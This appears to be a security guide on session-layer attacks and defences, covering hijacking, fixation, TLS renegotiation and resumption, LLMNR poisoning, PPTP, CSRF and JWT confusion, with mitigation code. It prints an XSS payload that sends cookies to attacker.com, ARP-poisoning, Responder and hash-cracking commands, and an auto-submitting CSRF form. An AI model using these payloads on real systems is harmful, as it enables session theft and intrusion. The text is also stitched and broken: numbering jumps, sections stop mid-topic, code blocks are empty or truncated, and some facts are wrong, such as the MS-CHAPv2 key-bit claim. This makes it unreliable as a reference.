## 1. OSI Layer 5 — What It Actually Is

### 1.1 Conceptual Position

The OSI model is a conceptual framework. In practice, the session layer is one of the most **misunderstood** layers because the modern internet TCP/IP stack collapses L5/L6/L7 into the application layer. Nevertheless, L5 **concepts** are real and manifest in:

- TLS session establishment and resumption
- HTTP session cookies and tokens
- NetBIOS session service
- RPC binding handles
- SMB sessions
- SSH sessions
- iSCSI sessions
- OAuth token sessions
- WebSocket persistent connections
- gRPC channels (HTTP/2 streams)
- Kerberos tickets

### 1.2 What L5 Does (Functional Responsibilities)
```
| Responsibility | Description |
|---|---|
| **Session Establishment** | Negotiates parameters, authenticates peers, allocates resources |
| **Session Maintenance** | Keeps the session alive, handles reconnects, manages half-duplex/full-duplex modes |
| **Session Termination** | Graceful teardown, frees state, revokes credentials |
| **Checkpointing / Recovery** | Long sessions can checkpoint progress (e.g., TFTP, NFS) |
| **Dialog Control** | Controls turn-taking — who speaks when (half-duplex vs full-duplex) |
| **Token Management** | Some L5 protocols pass tokens to control data flow direction |
```
### 1.3 L5 in the Real Protocol Stack

```
Application Layer (HTTP, gRPC, SMTP)
        |
    [ L5 Zone ]
     TLS 1.3 Record Layer — session state
     Session Cookies — application sessions
     OAuth Tokens — delegation sessions
     Kerberos Tickets — authentication sessions
        |
Transport Layer (TCP, QUIC)
        |
Network Layer (IP)
```

The key insight: **L5 security is fundamentally about session state security** — who owns it, how it is protected, how it expires, and what an attacker can do if they steal or forge it.

```
| OAuth 2.0 | L5/L7 | access_token, refresh_token | HTTPS |
| Kerberos | L5/L7 | TGT → Service Ticket | TCP/UDP 88 |
| WebSocket | L5/L7 | Upgrade handshake + persistent conn | TCP |
| gRPC | L5/L7 | HTTP/2 stream multiplexing | TCP/TLS |

| RTSP | L5/L7 | Session header | TCP/UDP |
| NFS v4 | L5/L7 | clientid, stateid | TCP 2049 |
```
### 2.2 TLS — The Dominant L5 Protocol

TLS is the most critical L5 protocol in modern systems. Understanding its internals is mandatory.

#### TLS 1.3 Handshake (Simplified)

```
Client                                           Server
  |                                                |
  |-------- ClientHello (supported ciphers) ------>|
  |         key_share (ECDH public key)            |
  |         psk_key_exchange_modes (optional)      |
  |                                                |
  |<------- ServerHello (chosen cipher) -----------|
  |         key_share (server ECDH public key)     |
  |         {EncryptedExtensions}                  |
  |         {Certificate}                          |
  |         {CertificateVerify}                    |
  |         {Finished}                             |
  |                                                |
  |-------- {Finished} ---------------------------->|
  |                                                |
  |===== Application Data (encrypted) ============|
```

**Session Resumption — 0-RTT (PSK):**

```
Client                                           Server
  |-- ClientHello + psk_binder + early_data ------>|
  |   (0-RTT: data sent before server responds)    |
  |<-- ServerHello + {Finished} -------------------|
  |<-- {Application Data} -------------------------|
```

The `early_data` extension enables 0-RTT resumption. This has critical security implications (replay vulnerability — covered in Attack 8).

## 3. Session Lifecycle Internals

### 3.1 Session State Machine

A session always follows this state machine regardless of the protocol:

```
  [INIT]
     |
     v
  [NEGOTIATION] ----error---> [FAILED]
     |
     v
  [AUTHENTICATION] --failure-> [REJECTED]
     |
     v
  [ESTABLISHED] <---keepalive---+
     |                          |
     +--timeout/error-----------+
     |
     v
  [TERMINATION]
     |
     v
  [CLOSED]
```

### 3.2 Session Identifiers — What Makes a Session

A session is identified and owned by one or more of:
```
| Identifier Type | Example | Vulnerability |
|---|---|---|
| Opaque token | `session_id=abc123` cookie | Theft via XSS, sniffing |
| Sequence-based ID | TLS Session ID (32 bytes) | Brute-forceable if short |
| Cryptographic token | JWT signed with HMAC | Algorithm confusion, weak secret |
| Ticket (opaque blob) | TLS Session Ticket | Ticket key compromise |
| Kerberos ticket | TGT/ST | Pass-the-ticket, Golden Ticket |
| QUIC Connection ID | 20-byte random | CID linkability |
| WebSocket upgrade | Connection: Upgrade + token | CSRF on upgrade |
```
### 3.3 Session Entropy Requirements

A session ID that is too short or uses a weak PRNG is enumerable:
```
| Token Length | PRNG Quality | Security |
|---|---|---|
| 32-bit sequential | N/A | Trivially guessable |
| 64-bit random (CSPRNG) | Good | Weak for high-value sessions |
| 128-bit random (CSPRNG) | Good | Acceptable minimum |
| 256-bit random (CSPRNG) | Good | Production standard |
| JWT RS256 | RSA 2048 | Depends on secret strength |
```
**Minimum bar:** 128 bits of entropy from a CSPRNG (`/dev/urandom`, `getrandom()`, or equivalent).

## 4. Threat Taxonomy

### 4.1 STRIDE Applied to L5
```
| Threat | L5 Manifestation |
|---|---|
| **Spoofing** | Session fixation, IP spoofing to inherit session |
| **Tampering** | Session token modification (unsigned cookies) |
| **Repudiation** | Shared sessions with no per-action audit log |
| **Information Disclosure** | Session ID in URL, logs, Referer header |
| **Denial of Service** | Session table exhaustion, SSL/TLS renegotiation DoS |
| **Elevation of Privilege** | Session confusion, privilege escalation via token swap |
```
### 4.2 Attack Surface Map

```
[Network Path]
  → Passive sniffing (MITM before TLS, SSLstrip)
  → Active injection (before TLS established)

[Application Layer]
  → XSS → cookie theft
  → CSRF → session misuse
  → Session fixation → pre-auth token reuse
  → Insecure deserialization of session objects

[Session Store]
  → Redis session store SSRF / unauthorized access
  → Database session table SQLi
  → Memory dump from server process

[Token / Ticket]
  → JWT algorithm confusion
  → TLS session ticket key theft
  → Kerberos ticket forgery (Golden/Silver/Diamond Ticket)

[Protocol Bugs]
  → TLS renegotiation (CVE-2009-3555)
  → BEAST (CBC mode, TLS < 1.1)
  → CRIME (compression oracle)
  → BREACH (HTTP compression oracle)
  → POODLE (SSLv3 padding oracle)
  → Lucky13 (CBC timing)
  → ROBOT (RSA key exchange)
```

## 5. Attack 1 — Session Hijacking

### 5.1 One-Line Summary

An attacker steals a valid session token and impersonates the legitimate user without needing their credentials.

### 5.2 Analogy

Someone snatches your hotel keycard from your pocket. They don't need your name or password — the keycard opens the door. Until the keycard expires or the hotel deactivates it, they have full access.

### 5.3 Attack Mechanics — Deep Dive

#### Vector 1: Network Sniffing (Pre-TLS or SSL-stripped)

Before TLS was universal, HTTP session cookies traversed the wire in plaintext. Tools:

```
# Wireshark filter for session cookies
http.cookie contains "session"

# Ettercap for LAN ARP poisoning + sniffing
ettercap -T -q -M arp:remote /gateway// /target//
```

**Even with TLS**, this can happen if:
- The `Secure` flag is missing on the cookie (sent over HTTP fallback)
- SSLstrip is used to downgrade HTTPS → HTTP
- Certificate validation is bypassed (MITM with rogue CA)

#### Vector 2: Cross-Site Scripting (XSS) Cookie Theft

The most prevalent modern vector:

```javascript
// Attacker injects this payload into a vulnerable page
// HTTPOnly flag BLOCKS this. Without it:
new Image().src = "https://attacker.com/steal?c=" + encodeURIComponent(document.cookie);
```

**Why HTTPOnly is not a silver bullet:**
- XSS can still make authenticated requests even without reading the cookie
- CSRF uses the session without reading it
- Some frameworks have partial HTTPOnly bypass bugs

#### Vector 3: Session ID in URL

Legacy applications or poorly configured ones put session IDs in query parameters:

```
https://app.example.com/dashboard?session=abc123
```

This leaks in:
- Browser history
- `Referer` header (sent to third-party resources on the page)
- Server access logs
- CDN/proxy logs
- Shared links

#### Vector 4: Sub-domain Takeover → Cookie Scope

If `legacy.example.com` can be taken over (expired DNS CNAME pointing to abandoned cloud resource), and cookies are scoped to `.example.com`, the attacker can read cookies from the parent domain via JavaScript on the subdomain.

```
# Check for dangling CNAMEs
dig CNAME legacy.example.com
# If CNAME points to a cloud resource not claimed → takeover possible
```

#### Vector 5: Man-in-the-Middle (Network Level)

```
[Client] <--ARP Poison--> [Attacker] <--Forward--> [Server]
                              |
                        Reads session cookie
                        in HTTP traffic
```

Even on TLS, if the attacker can install a trusted root CA (corporate proxy, compromised device), they terminate TLS and see all plaintext.

### 5.4 Mitigation — Comprehensive

#### Cookie Security Attributes (Mandatory)

```
Set-Cookie: session=<token>;
  HttpOnly;          ← blocks JS access
  Secure;            ← HTTPS only
  SameSite=Strict;   ← blocks CSRF
  Path=/;
  Domain=example.com; ← explicit, avoid leading dot
  Max-Age=3600;      ← expiry in seconds
```

**SameSite values:**
- `Strict` — cookie never sent in cross-origin requests (best for session cookies)
- `Lax` — sent in cross-origin GET navigations (default in modern browsers)
- `None` — sent in all contexts (requires `Secure`)

#### Session ID Generation (Correct)

```rust
// Rust: Using ring or rand for CSPRNG session IDs
use rand::Rng;

fn generate_session_id() -> String {
    let mut rng = rand::thread_rng();
    let bytes: [u8; 32] = rng.gen(); // 256 bits
    hex::encode(bytes)
}
```

```go
// Go: crypto/rand for session IDs
import (
    "crypto/rand"
    "encoding/hex"
)

func generateSessionID() (string, error) {
    b := make([]byte, 32) // 256 bits
    if _, err := rand.Read(b); err != nil {
        return "", err
    }
    return hex.EncodeToString(b), nil
}
```

#### Session Binding — Tie Session to Client Fingerprint

Bind the session to additional factors that must match on each request:

```go
type Session struct {
    ID          string
    UserID      string
    CreatedAt   time.Time
    LastSeen    time.Time
    IPHash      string    // hash of client IP (not raw IP — CGNAT aware)
    UserAgent   string    // browser fingerprint
    CountryCode string    // GeoIP-based
}

func validateSession(sess *Session, req *http.Request) bool {
    // Soft binding — flag anomaly but don't always reject (mobile IPs change)
    currentIPHash := hashIP(getClientIP(req))
    if sess.IPHash != currentIPHash {
        log.Warn("session IP mismatch — possible hijack", ...)
        // For high-security: reject; for UX: challenge with MFA
    }
    return true
}
```

#### Absolute and Idle Timeout

```go
const (
    SessionAbsoluteTimeout = 8 * time.Hour   // max session lifetime
    SessionIdleTimeout     = 30 * time.Minute // max idle time
)

func isSessionValid(sess *Session) bool {
    now := time.Now()
    if now.Sub(sess.CreatedAt) > SessionAbsoluteTimeout {
        return false
    }
    if now.Sub(sess.LastSeen) > SessionIdleTimeout {
        return false
    }
    return true
}
```

#### Session Rotation on Privilege Escalation

```go
// Always issue a NEW session ID after login
// The pre-auth session ID must be invalidated
func handleLogin(w http.ResponseWriter, r *http.Request) {
    oldSessionID := getSessionID(r)
    
    user, err := authenticate(r)
    if err != nil {
        http.Error(w, "unauthorized", http.StatusUnauthorized)
        return
    }
    
    // Invalidate old session
    sessionStore.Delete(oldSessionID)
    
    // Create new session post-authentication
    newSessionID, _ := generateSessionID()
    sessionStore.Set(newSessionID, &Session{
        UserID:    user.ID,
        CreatedAt: time.Now(),
        LastSeen:  time.Now(),
    })
    
    setSessionCookie(w, newSessionID)
}
```

## 6. Attack 2 — Session Fixation

### 6.1 One-Line Summary

The attacker forces the victim to use a known session ID (one the attacker controls), then waits for the victim to authenticate to inherit the authenticated session.

### 6.2 Analogy

You check into a hotel and the attacker secretly replaces your blank keycard with their pre-registered keycard. Once you check in and the keycard gets activated to your room, the attacker's copy — which has the same ID — also works.

### 6.3 Attack Mechanics

```
Step 1: Attacker obtains a valid pre-auth session ID
        GET /app → Set-Cookie: session=ATTACKER_KNOWN_ID

Step 2: Attacker tricks victim into using that session ID
        Methods:
         - Embed in URL: https://app.com/login?session=ATTACKER_KNOWN_ID
         - XSS to set cookie: document.cookie = "session=ATTACKER_KNOWN_ID"
         - Meta redirect: <meta http-equiv="Set-Cookie" content="session=ATTACKER_KNOWN_ID">

Step 3: Victim logs in using ATTACKER_KNOWN_ID
        Server promotes ATTACKER_KNOWN_ID to authenticated state

Step 4: Attacker uses ATTACKER_KNOWN_ID → authenticated!
```

### 6.4 Vulnerable Code Pattern

```python
# VULNERABLE: Python/Flask — session ID not rotated on login
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['user'], request.form['pass'])
    if user:
        session['user_id'] = user.id  # BUG: session ID stays the same!
        return redirect('/dashboard')
```

### 6.5 Mitigation

**Primary Fix:** Always regenerate the session ID upon successful authentication, privilege change, or significant state change.

```go
// Go: Session fixation prevention
func login(w http.ResponseWriter, r *http.Request) {
    creds := parseCredentials(r)
    user, err := authService.Authenticate(creds)
    if err != nil {
        http.Error(w, "invalid credentials", 401)
        return
    }

    // Invalidate ALL existing sessions for this user (optional, paranoid mode)
    // This prevents parallel sessions
    sessionStore.DeleteByUserID(user.ID)

    // Always create a fresh session after auth
    newID := mustGenerateSessionID()
    sess := &Session{
        ID:        newID,
        UserID:    user.ID,
        CreatedAt: time.Now(),
        LastSeen:  time.Now(),
    }
    sessionStore.Set(newID, sess)

    http.SetCookie(w, &http.Cookie{
        Name:     "session",
        Value:    newID,
        HttpOnly: true,
        Secure:   true,
        SameSite: http.SameSiteStrictMode,
        MaxAge:   3600,
    })
}
```

**Additional Hardening:**

- Never accept session IDs from URL parameters in POST/GET auth flows
- Set `Accept-CH` and validate user-agent binding
- Do not pre-create sessions for unauthenticated users (use CSRF token instead for pre-auth forms)

## 7. Attack 3 — SSL/TLS Session Renegotiation Attack

### 7.1 One-Line Summary

An attacker exploits TLS renegotiation to inject plaintext prefix data into a victim's established TLS session, tricking the server into processing attacker-controlled requests as if they came from the authenticated client.

### 7.2 CVE-2009-3555 — The Classic

**CVSS Score:** 5.8 (later revised to 7.5 for some scenarios)

This vulnerability existed because TLS 1.0/1.1 allowed renegotiation (re-handshake within an existing TLS session) without any cryptographic binding to the original handshake.

### 7.3 Attack Mechanics

```
Attack Flow:

1. Attacker connects to HTTPS server: [Attacker] --TLS1--> [Server]
   (Attacker now has authenticated TLS session)

2. Attacker sends partial HTTP request (without sending it completely):
   "GET /admin HTTP/1.1\r\nHost: example.com\r\n"

3. Attacker triggers renegotiation, handing off to victim:
   [Attacker hands TLS connection to Victim]

4. Victim completes the TLS handshake (renegotiation):
   [Victim] --TLS renegotiation--> [Server]
   Victim thinks they have a fresh TLS session.

5. Server appends Victim's data to Attacker's prefix:
   Combined request: "GET /admin HTTP/1.1\r\nHost: example.com\r\n"
                      + Victim's legitimate request

6. Server sees Victim's authenticated cookies attached to Attacker's URI!
   → Executes Attacker's request with Victim's authentication!
```

### 7.4 The Fix — RFC 5746 (TLS Renegotiation Indication Extension)

RFC 5746 introduced the `renegotiation_info` extension. When renegotiating, both sides must include a hash of the previous handshake's Finished messages. This cryptographically binds renegotiations to the original session.

```
# Check if server supports secure renegotiation
openssl s_client -connect example.com:443 -tls1_2
# Look for: "Secure Renegotiation IS supported"

# Test for vulnerable servers
openssl s_client -connect vulnerable.example.com:443
# Then: R (renegotiate) — watch for failures
```

### 7.5 TLS Renegotiation in Modern Context

TLS 1.3 **completely removed renegotiation**. The concept of "renegotiation" no longer exists in TLS 1.3. Instead:
- Key updates use `KeyUpdate` message
- Post-handshake authentication uses `CertificateRequest`

**Mitigation checklist:**
- Enforce TLS 1.3 minimum (or TLS 1.2 with RFC 5746)
- Disable renegotiation entirely in your TLS library where possible:

```go
// Go: crypto/tls — disable renegotiation
tlsConfig := &tls.Config{
    MinVersion: tls.VersionTLS13,
    // In TLS 1.3 renegotiation is gone
    // For TLS 1.2 compliance:
    Renegotiation: tls.RenegotiateNever, // key field
}
```

```rust
// Rust: rustls — renegotiation not supported by design
// rustls explicitly does not implement TLS renegotiation
// This is a feature, not a limitation
let config = rustls::ClientConfig::builder()
    .with_safe_defaults()
    .with_root_certificates(root_store)
    .with_no_client_auth();
```

## 8. Attack 4 — TLS Session Resumption Attacks (Ticket Theft / PSK Abuse)

### 8.1 Session Resumption — How It Works

TLS 1.2 had two resumption mechanisms:
- **Session ID:** Server caches session state, client presents ID on reconnect
- **Session Tickets:** Server encrypts session state, sends to client; client presents on reconnect

TLS 1.3 uses **Pre-Shared Keys (PSK)** for resumption. The server sends a `NewSessionTicket` message post-handshake, which the client can use later.

### 8.2 Attack: TLS Session Ticket Key Compromise

TLS session tickets are encrypted with a server-side key called the **STEK (Session Ticket Encryption Key)**. If an attacker compromises the STEK:

1. They can decrypt any captured TLS session tickets
2. They can decrypt the session state (master secret or resumption secret)
3. They can decrypt all past and future sessions using that STEK
4. If they have captured traffic (passive recording), they can decrypt it retrospectively

This is the primary objection against TLS 1.2 session tickets providing **Perfect Forward Secrecy (PFS)**: if you compromise the STEK, you compromise past sessions.

**Real-world scenario:**
- Attacker exfiltrates STEK from load balancer
- Attacker had been passively recording TLS traffic for months
- Now decrypts all recorded sessions retrospectively

```bash
# Check if session tickets are used and STEK rotation
openssl s_client -connect example.com:443 -reconnect 2>/dev/null | grep -i "session ticket"

# Check for ticket reuse (should NOT reuse exact same ticket)
```

### 8.3 Attack: 0-RTT Replay in TLS 1.3

TLS 1.3 0-RTT (zero round-trip time) resumption allows the client to send application data in the very first flight, before the server has confirmed the handshake. This introduces **replay vulnerability**.

```
Attacker captures 0-RTT ClientHello + early_data:
  ClientHello + psk_binder + {POST /transfer amount=1000}

Attacker replays to same server (or different server in cluster):
  Server processes: POST /transfer amount=1000
  → Money transferred again!
```

**The constraint:** 0-RTT replay can only replay what was in the early data. The server cannot tell if it's a replay.

**When is 0-RTT safe?**
- Safe: Idempotent GET requests for cached content
- Unsafe: POST, PUT, DELETE, or any state-modifying operations
- Unsafe: Any request with side effects

### 8.4 Mitigations

#### STEK Management

```
Rotation schedule: Rotate STEK every 24 hours
Distribution: Use secure key management (HashiCorp Vault, AWS KMS)
Key lifetime: Max 48 hours before decryption key is destroyed
Multi-server: Use distributed STEK (all load balancer nodes must share)
```

**Nginx STEK rotation example:**

```nginx
# nginx.conf — session ticket key rotation
ssl_session_ticket_key /etc/nginx/ticket-current.key;   # decrypts + encrypts
ssl_session_ticket_key /etc/nginx/ticket-previous.key;  # decrypts only

# Rotate: generate new key, move current to previous, generate new current
# Do this every 24 hours via cron
```

#### TLS 1.3 0-RTT Handling

```go
// Go: Reject 0-RTT for non-idempotent operations
func handle(w http.ResponseWriter, r *http.Request) {
    // In Go's crypto/tls, you can check if the connection used early data
    // via the TLSConnectionState
    if tlsState := r.TLS; tlsState != nil {
        // For now: require safe methods only if early data is in use
        // Go doesn't expose early data directly; handle via proxy headers
    }

    // Safe pattern: Only allow GET/HEAD with 0-RTT
    if r.TLS != nil && r.Method != http.MethodGet && r.Method != http.MethodHead {
        // If fronted by a proxy that strips 0-RTT for non-GET: you're fine
        // Otherwise: add idempotency token requirement
    }
}
```

```rust
// Rust: rustls rejects 0-RTT by default
// Early data must be explicitly enabled
// When enabled, use anti-replay protection:
let config = ServerConfig::builder()
    .with_safe_defaults()
    .with_no_client_auth()
    .with_single_cert(certs, key)?;
// Enable with anti-replay:
// config.max_early_data_size = 0; // Disables 0-RTT (safe default)
```

## 9. Attack 5 — NetBIOS / SMB Session Attacks

### 9.1 NetBIOS Session Service (Port 139)

NetBIOS Session Service establishes sessions before SMB data exchange. The session is identified by NetBIOS names (16-byte strings). Attacks include:

#### NBT-NS / LLMNR Poisoning

When Windows systems fail to resolve a hostname via DNS, they fall back to:
1. Link-Local Multicast Name Resolution (LLMNR) — UDP 5355
2. NetBIOS Name Service (NBT-NS) — UDP 137

An attacker on the same network can respond to these broadcasts with their own IP:

```
Victim:   "Who has \\FILESERVER?"  (broadcast)
Attacker: "I am \\FILESERVER!"     (forged response)
Victim:   Connects to attacker's machine with NTLM credentials
Attacker: Captures NTLMv2 hash → offline cracking
```

**Tool: Responder**

```bash
# Run Responder to poison LLMNR/NBT-NS
sudo responder -I eth0 -wrf
# Captures: NTLMv2 hashes from nearby machines

# Crack captured hash
hashcat -m 5600 captured_hash.txt wordlist.txt
```

#### SMB Relay Attack

Instead of cracking, relay the NTLM authentication to another service:

## 11. Attack 7 — PPTP / L2TP Session Weaknesses

### 11.1 PPTP (Point-to-Point Tunneling Protocol)

PPTP operates on TCP 1723 for session control and GRE (Protocol 47) for data. The session is established through PPP negotiation within the GRE tunnel.

**PPTP is fundamentally broken.** Do not use it. But understanding why is instructive.

**MS-CHAPv2 (used by PPTP) weaknesses:**

1. MS-CHAPv2 is broken: DES with only 7 effective key bits, can be cracked in <24 hours using a crack.sh-style lookup.
2. No certificate-based authentication by default.
3. Subject to MITM because there's no server authentication in the challenge-response.

```bash
# Capture MS-CHAPv2 handshake and crack
# Step 1: Capture the handshake (e.g., via Wireshark on PPTP)
# Step 2: Extract challenge/response
# Step 3: Submit to crack.sh or use:
asleap -C <challenge> -R <response> -W wordlist.txt
```

### 11.2 L2TP without IPSec

L2TP itself provides no encryption. It requires IPSec for security. L2TP/IPSec is secure when:
- Pre-Shared Key (PSK) is strong and unique
- Certificates are used instead of PSK
- IKEv2 is used (not IKEv1)

**L2TP session attack — without IPSec:**

L2TP sessions are identified by Tunnel ID and Session ID (both 16-bit values). Without IPSec:
- These are transmitted in plaintext
- Session IDs can be enumerated (only 65535 possibilities)
- Injection attacks possible

**Mitigation: Do not use PPTP. Use IKEv2/IPSec or WireGuard.**

```bash

# - Formally verified cryptography (Noise protocol)
```

## 12. Attack 8 — Session Replay Attacks

### 12.1 One-Line Summary

An attacker captures a valid session-layer message and retransmits it to the server to repeat the original action.

### 12.2 Mechanics

**Classic replay on authentication:**

```
Victim authenticates: 
  Client → Server: {username: "alice", timestamp: "2024-01-01T10:00:00Z", 
                    signature: "HMAC(secret, username+timestamp)"}

Attacker captures this.
Attacker replays 5 minutes later:
  Attacker → Server: {username: "alice", timestamp: "2024-01-01T10:00:00Z",
                      signature: "HMAC(secret, username+timestamp)"}

Server: signature valid, accepts!
```

**TLS 1.3 0-RTT Replay (specific):**

```
Captured: ClientHello + {POST /api/pay {amount: 100, to: "bob"}} (early_data)
Replay: Same captured bytes sent to server cluster node B
Server B: Processes payment again — $100 sent to bob twice
```

**Kerberos replay:**

Kerberos tickets are valid for a time window (default 5 minutes). If an attacker captures an Authenticator (which has a timestamp), they can replay it within the validity window.

### 12.3 Anti-Replay Mechanisms

| Mechanism | How it works | Limitation |
|---|---|---|
| **Nonce** | Server issues one-time number, client includes in response | Server must track used nonces |
| **Timestamp + skew window** | Reject messages older than N seconds | Clock skew issues |
| **Sequence numbers** | Monotonically increasing, server rejects out-of-order/duplicate | State required |
| **CSRF token** | Per-request token checked server-side | Single-server sessions or shared state |
| **Idempotency key** | Client-generated unique ID per operation | Client must generate and track |

### 12.4 Implementation

```go
// Go: Nonce-based anti-replay for API authentication
package auth

import (
    "sync"
    "time"
    "crypto/rand"
    "encoding/hex"
)

type NonceStore struct {
    mu     sync.Mutex
    nonces map[string]time.Time
    window time.Duration
}

func NewNonceStore(window time.Duration) *NonceStore {
    ns := &NonceStore{
        nonces: make(map[string]time.Time),
        window: window,
    }
    go ns.cleanup()
    return ns
}

// Validate returns false if nonce has been seen before
func (ns *NonceStore) Validate(nonce string, ts time.Time) bool {
    ns.mu.Lock()
    defer ns.mu.Unlock()

    // Check timestamp is within acceptable window
    now := time.Now()
    if now.Sub(ts) > ns.window || ts.Sub(now) > 30*time.Second {
        return false // too old or from the future
    }

    // Check if nonce has been used
    if _, exists := ns.nonces[nonce]; exists {
        return false // replay detected!
    }

    ns.nonces[nonce] = ts
    return true
}

// Cleanup expired nonces periodically
func (ns *NonceStore) cleanup() {
    ticker := time.NewTicker(ns.window)
    for range ticker.C {
        ns.mu.Lock()
        threshold := time.Now().Add(-ns.window)
        for nonce, ts := range ns.nonces {
            if ts.Before(threshold) {
                delete(ns.nonces, nonce)
            }
        }
        ns.mu.Unlock()
    }
}

// GenerateNonce for server-issued nonces
func GenerateNonce() (string, error) {
    b := make([]byte, 16)
    if _, err := rand.Read(b); err != nil {
        return "", err
    }
    return hex.EncodeToString(b), nil
}
```

```rust
// Rust: Distributed anti-replay with Redis
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use redis::AsyncCommands;

pub struct AntiReplayService {
    redis: redis::aio::MultiplexedConnection,
    window: Duration,
}

impl AntiReplayService {
    pub async fn check_and_consume(&mut self, nonce: &str, timestamp: u64) -> bool {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();

        // Reject if timestamp is out of window
        let diff = now.saturating_sub(timestamp).max(timestamp.saturating_sub(now));
        if diff > self.window.as_secs() {
            return false;
        }

        // SET NX EX — atomic: set if not exists, with TTL
        let key = format!("nonce:{}", nonce);
        let result: Option<String> = self.redis
            .set_options(
                &key,
                "1",
                redis::SetOptions::default()
                    .conditional_set(redis::ExistenceCheck::NX)
                    .with_expiration(redis::SetExpiry::EX(self.window.as_secs())),
            )
            .await
            .unwrap_or(None);

        result.is_some() // None means key existed → replay!
    }
}
```

## 13. Attack 9 — Half-Open / SYN Session Exhaustion at L5

### 13.1 Session Table Exhaustion

While SYN flood is primarily L4, the L5 session layer is equally affected. Stateful session management requires server-side memory per session. An attacker can exhaust this in multiple ways:

#### L5 Application Session Exhaustion

```
Attack: Open thousands of connections, complete TCP handshake,
        send initial HTTP request, then go silent (never complete L5 session).

Effect: Server allocates session objects, waits for auth, times out slowly.
        If session creation is expensive (DB write, crypto op), this is amplified.
```

**Metrics to watch:**
- Active sessions in session store vs authenticated sessions
- Ratio of orphaned sessions (created but never authenticated)
- Memory consumption of session store

**Mitigation:**

```go
// Go: Rate limit session creation
import "golang.org/x/time/rate"

type SessionLimiter struct {
    perIP   map[string]*rate.Limiter
    mu      sync.Mutex
    rate    rate.Limit
    burst   int
}

func (sl *SessionLimiter) Allow(ip string) bool {
    sl.mu.Lock()
    lim, ok := sl.perIP[ip]
    if !ok {
        lim = rate.NewLimiter(sl.rate, sl.burst)
        sl.perIP[ip] = lim
    }
    sl.mu.Unlock()
    return lim.Allow()
}

// Usage: max 10 new sessions per second per IP, burst of 20
var sessionLimiter = &SessionLimiter{
    perIP: make(map[string]*rate.Limiter),
    rate:  10,
    burst: 20,
}
```

#### TLS Handshake Exhaustion (TLS-level DoS)

TLS handshakes are computationally expensive, especially:
- ECDH key generation
- Certificate chain validation
- RSA decryption (TLS 1.2 with RSA key exchange)

Attackers can initiate thousands of TLS handshakes without completing them, exhausting server CPU.

**Mitigation:**

```nginx

ssl_session_timeout 1d;
```

## 14. Attack 10 — Cross-Site Request Forgery (CSRF) — Session Abuse

### 14.1 One-Line Summary

An attacker tricks a victim's browser into making authenticated requests to a target site, abusing the victim's existing session without needing to steal the session token.

### 14.2 Mechanics

```
Victim is logged into bank.com (session cookie automatically sent)

Attacker's evil.com page contains:
<form action="https://bank.com/transfer" method="POST" id="f">
    <input name="amount" value="10000">
    <input name="to" value="attacker-account">
</form>
<script>document.getElementById('f').submit();</script>

Browser loads evil.com → form auto-submits → bank.com receives:
POST /transfer with:
  Cookie: session=victim_session_id  ← automatically included
  Body: amount=10000&to=attacker-account

Bank.com processes the transfer!
```

### 14.3 Why CSRF is an L5 Problem

The attack exploits the session layer mechanism (browser automatically attaches session cookies to cross-origin requests) rather than any application logic bug. The session token is **correct** — it belongs to the victim. But the **request intent** is attacker-controlled.

### 14.4 Defenses

#### Defense 1: SameSite Cookie Attribute

```
Set-Cookie: session=...; SameSite=Strict

SameSite=Strict:
  - Cookie NOT sent on cross-site requests (any navigation)
  - Breaks cross-origin redirect flows that need session
  
SameSite=Lax (default in modern browsers):
  - Cookie sent on top-level GET navigations
  - Cookie NOT sent on cross-origin POST/PUT/DELETE
  - Covers most CSRF cases
  
SameSite=None:
  - Always sent
  - Requires Secure flag
  - CSRF vulnerable without other protections
```

#### Defense 2: CSRF Token (Synchronizer Token Pattern)

```go
// Go: CSRF token generation and validation

    sig := mac.Sum(nil)

    return base64.URLEncoding.EncodeToString(payload)
}
```

## 15. Attack 11 — OAuth / OpenID Session Token Attacks

### 15.1 OAuth 2.0 Session Model

OAuth 2.0 is an authorization delegation protocol. It creates delegated sessions via:

| Token | Purpose | Lifetime | Storage |
|---|---|---|---|
| `access_token` | API access | Short (15min - 1hr) | Memory / local |
| `refresh_token` | Get new access_token | Long (days - months) | HttpOnly cookie or secure storage |
| `id_token` | Identity (OpenID Connect) | Short | Memory |
| `authorization_code` | Exchange for tokens | 1-use, 60 seconds | URL → redirect |

### 15.2 Attack: Authorization Code Interception

```
Standard flow:
  Client → Auth Server: GET /auth?response_type=code&redirect_uri=https://app.com/callback
  User authenticates
  Auth Server → redirect: https://app.com/callback?code=AUTH_CODE

Attack (without PKCE):
  Attacker registers app with same redirect_uri (or uses open redirect)
  OR intercepts the redirect (mobile apps using custom URL schemes)
  Attacker exchanges AUTH_CODE for tokens
```

**PKCE (Proof Key for Code Exchange) prevents this:**

```python
import hashlib
import base64
import secrets

# Client generates:
code_verifier = secrets.token_urlsafe(64)  # 256-bit random
code_challenge = base64.urlsafe_b64encode(
    hashlib.sha256(code_verifier.encode()).digest()
).rstrip(b'=').decode()

# Send code_challenge in auth request
# Send code_verifier in token exchange

# Server: SHA256(code_verifier) == code_challenge
# Attacker who intercepts code cannot exchange it without code_verifier
```

### 15.3 Attack: JWT Algorithm Confusion

JWT tokens signed with RS256 (asymmetric) can be vulnerable if the server accepts HS256 (symmetric):

```python
# Vulnerable server pseudo-code:
def verify_jwt(token):
    header = decode_header(token)
    algorithm = header['alg']  # ATTACKER CONTROLLED!
    
    if algorithm == 'RS256':
        verify_with_public_key(token, public_key)
    elif algorithm == 'HS256':
        verify_with_secret(token, public_key)  # BUG: uses public_key as HMAC secret!
```

**Attack:**

1. Server uses RS256, exposes public key at `/.well-known/jwks.json`
2. Attacker downloads public key
3. Attacker creates JWT with `"alg": "HS256"` header
4. Signs with the **public key** as the HMAC secret
5. Vulnerable server: verifies HS256 with `public_key` as secret → VALID!

**Fix:**

```go
// Go: Always explicitly specify the allowed algorithm
token, err := jwt.ParseWithClaims(
    tokenString,
    &Claims{},
    func(token *jwt.Token) (interface{}, error) {
        // Enforce algorithm — reject anything else
        if _, ok := token.Method.(*jwt.SigningMethodRSA); !ok {
            return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
        }
        return publicKey, nil
    },
)
```

### 15.4 Attack: Token Leakage via Referer

```
User has access_token in URL:
https://app.com/dashboard#access_token=SECRET_TOKEN

Page loads third-party resource (analytics, fonts)
Referer header: https://app.com/dashboard#access_token=SECRET_TOKEN

Third party sees the token! → Account compromise
```

**Fix:** Never put tokens in URL fragments or query parameters. Use:
- HttpOnly cookies for web apps
- Memory (not localStorage) for SPAs
